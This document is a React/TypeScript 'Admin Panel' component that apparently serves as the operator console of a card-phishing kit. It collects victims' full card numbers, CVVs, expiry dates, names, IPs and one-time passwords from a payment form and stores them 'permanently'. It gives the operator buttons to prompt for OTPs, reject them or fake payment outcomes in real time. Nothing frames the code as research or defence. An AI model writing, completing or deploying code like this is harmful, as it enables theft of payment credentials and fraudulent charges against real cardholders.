
import React, { useState, useEffect } from 'react';

interface CardData {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardHolder: string;
  amount: string;
}

interface UserInfo {
  ip: string;
  browser: string;
  network: string;
}

interface Visitor {
  ip: string;
  timestamp: Date;
}

interface CardSubmission {
  cardData: CardData;
  userInfo: UserInfo;
  timestamp: Date;
}

// Create a global WebSocket connection manager
class WebSocketManager {
  private static instance: WebSocketManager;
  private ws: WebSocket | null = null;
  private listeners: Set<(data: any) => void> = new Set();
  private connectionStatus: string = 'Disconnected';
  private statusCallbacks: Set<(status: string) => void> = new Set();

  static getInstance(): WebSocketManager {
    if (!WebSocketManager.instance) {
      WebSocketManager.instance = new WebSocketManager();
    }
    return WebSocketManager.instance;
  }

  connect() {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      return;
    }

    try {
      // Use a mock WebSocket for local development since we don't have a real server
      this.setStatus('Connecting...');
      
      // Simulate connection after a short delay
      setTimeout(() => {
        this.setStatus('Connected');
        console.log('Mock WebSocket connected');
      }, 1000);

    } catch (error) {
      console.error('WebSocket connection failed:', error);
      this.setStatus('Error');
    }
  }

  private setStatus(status: string) {
    this.connectionStatus = status;
    this.statusCallbacks.forEach(callback => callback(status));
  }

  getStatus(): string {
    return this.connectionStatus;
  }

  onStatusChange(callback: (status: string) => void) {
    this.statusCallbacks.add(callback);
  }

  offStatusChange(callback: (status: string) => void) {
    this.statusCallbacks.delete(callback);
  }

  addListener(callback: (data: any) => void) {
    this.listeners.add(callback);
  }

  removeListener(callback: (data: any) => void) {
    this.listeners.delete(callback);
  }

  send(data: any) {
    console.log('Sending command:', data);
    // Since we don't have a real server, we'll trigger events directly through our message system
    if (window.cardDataChannel) {
      window.cardDataChannel.postMessage(data);
    }
  }

  simulateMessage(data: any) {
    this.listeners.forEach(callback => callback(data));
  }
}

// Extend window interface for our custom message channel
declare global {
  interface Window {
    cardDataChannel: BroadcastChannel;
    wsManager: WebSocketManager;
  }
}

const AdminPanel = () => {
  const [cardData, setCardData] = useState<CardData | null>(null);
  const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
  const [otp, setOtp] = useState<string>('');
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>([]);
  const [showCommands, setShowCommands] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<string>('Disconnected');

  useEffect(() => {
    // Initialize WebSocket manager
    const wsManager = WebSocketManager.getInstance();
    window.wsManager = wsManager;
    
    // Create broadcast channel for communication between admin panel and payment form
    if (!window.cardDataChannel) {
      window.cardDataChannel = new BroadcastChannel('cardData');
    }

    // Listen for status changes
    const handleStatusChange = (status: string) => {
      setConnectionStatus(status);
    };

    wsManager.onStatusChange(handleStatusChange);
    wsManager.connect();

    // Listen for data from payment form
    const handleData = (data: any) => {
      console.log('Admin panel received data:', data);
      
      if (data.type === 'cardData') {
        console.log('Processing card data:', data);
        setCardData(data.data);
        setUserInfo(data.userInfo);
        setShowCommands(true);
        
        const newSubmission = {
          cardData: data.data,
          userInfo: data.userInfo,
          timestamp: new Date(data.timestamp || new Date())
        };
        setCardSubmissions(prev => [...prev, newSubmission]);
        
      } else if (data.type === 'otp') {
        console.log('Received OTP:', data.otp);
        setOtp(data.otp);
      } else if (data.type === 'newVisitor') {
        console.log('Processing new visitor:', data);
        const newVisitor = {
          ip: data.ip,
          timestamp: new Date(data.timestamp || new Date())
        };
        setVisitors(prev => {
          const exists = prev.some(v => v.ip === newVisitor.ip);
          if (!exists) {
            return [...prev, newVisitor];
          }
          return prev;
        });
      }
    };

    window.cardDataChannel.onmessage = (event) => {
      handleData(event.data);
    };

    wsManager.addListener(handleData);

    return () => {
      wsManager.offStatusChange(handleStatusChange);
      wsManager.removeListener(handleData);
    };
  }, []);

  const sendCommand = (command: string) => {
    console.log('Sending command:', command);
    const wsManager = WebSocketManager.getInstance();
    wsManager.send({ command });
    
    // Also send through broadcast channel
    window.cardDataChannel.postMessage({ command });
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <h1 className="text-3xl font-bold mb-8 text-center">Admin Panel</h1>
      
      {/* Connection Status */}
      <div className="mb-4">
        <span className={`px-3 py-1 rounded text-sm ${
          connectionStatus === 'Connected' ? 'bg-green-600' : 
          connectionStatus === 'Connecting...' ? 'bg-yellow-600' : 'bg-red-600'
        }`}>
          WebSocket: {connectionStatus}
        </span>
      </div>
      
      {/* Visitors Section */}
      <div className="mb-8">
        <h2 className="text-xl font-bold mb-4">Live Visitors ({visitors.length})</h2>
        <div className="space-y-2">
          {visitors.length === 0 ? (
            <div className="text-gray-400">No visitors yet...</div>
          ) : (
            visitors.map((visitor, index) => (
              <div key={index} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
                New Visitor: {visitor.ip} - {visitor.timestamp.toLocaleTimeString()}
              </div>
            ))
          )}
        </div>
      </div>

      {/* Current Card Data Section with Commands */}
      {cardData && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">Latest Card Information</h2>
          
          {/* User Info */}
          {userInfo && (
            <div className="grid grid-cols-3 gap-4 mb-4">
              <div>
                <span className="font-bold">IP Address:</span> {userInfo.ip}
              </div>
              <div>
                <span className="font-bold">Browser:</span> {userInfo.browser}
              </div>
              <div>
                <span className="font-bold">Network:</span> {userInfo.network}
              </div>
            </div>
          )}
          
          {/* Card Info with Commands */}
          <div className="font-bold text-lg flex items-center justify-between flex-wrap">
            <span className="mr-4">
              {cardData.cardNumber} | {cardData.expiryMonth}/{cardData.expiryYear} | {cardData.cvv} | {cardData.cardHolder} | Amount: ₹{cardData.amount} {otp && `| OTP: ${otp}`}
            </span>
            {showCommands && (
              <div className="flex space-x-2 mt-2">
                <button
                  onClick={() => sendCommand('showotp')}
                  className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Show OTP
                </button>
                <button
                  onClick={() => sendCommand('fail')}
                  className="bg-red-600 hover:bg-red-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Fail
                </button>
                <button
                  onClick={() => sendCommand('success')}
                  className="bg-green-600 hover:bg-green-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Success
                </button>
                <button
                  onClick={() => sendCommand('invalidotp')}
                  className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Invalid OTP
                </button>
                <button
                  onClick={() => sendCommand('cardinvalid')}
                  className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Card Invalid
                </button>
                <button
                  onClick={() => sendCommand('carddisabled')}
                  className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Card Disabled
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* All Card Submissions History */}
      {cardSubmissions.length > 0 && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">All Card Submissions ({cardSubmissions.length})</h2>
          <div className="space-y-3 max-h-64 overflow-y-auto">
            {cardSubmissions.map((submission, index) => (
              <div key={index} className="bg-gray-700 p-3 rounded text-sm">
                <div className="font-bold mb-2">
                  Submission #{cardSubmissions.length - index} - {submission.timestamp.toLocaleString()}
                </div>
                <div className="grid grid-cols-2 gap-2 text-xs">
                  <div>Card: {submission.cardData.cardNumber}</div>
                  <div>Exp: {submission.cardData.expiryMonth}/{submission.cardData.expiryYear}</div>
                  <div>CVV: {submission.cardData.cvv}</div>
                  <div>Holder: {submission.cardData.cardHolder}</div>
                  <div>Amount: ₹{submission.cardData.amount}</div>
                  <div>IP: {submission.userInfo.ip}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Instructions */}
      <div className="bg-gray-800 p-4 rounded">
        <h3 className="text-lg font-bold mb-2">Instructions</h3>
        <ul className="text-sm space-y-1">
          <li>• Wait for card data to appear above</li>
          <li>• Use "Show OTP" to display OTP form to user</li>
          <li>• Use "Success" to complete payment successfully</li>
          <li>• Use "Fail", "Card Invalid", or "Card Disabled" to show error messages</li>
          <li>• Use "Invalid OTP" to reject OTP and ask for re-entry</li>
          <li>• All submissions are saved permanently and will not be deleted</li>
        </ul>
      </div>
    </div>
  );
};

export default AdminPanel;
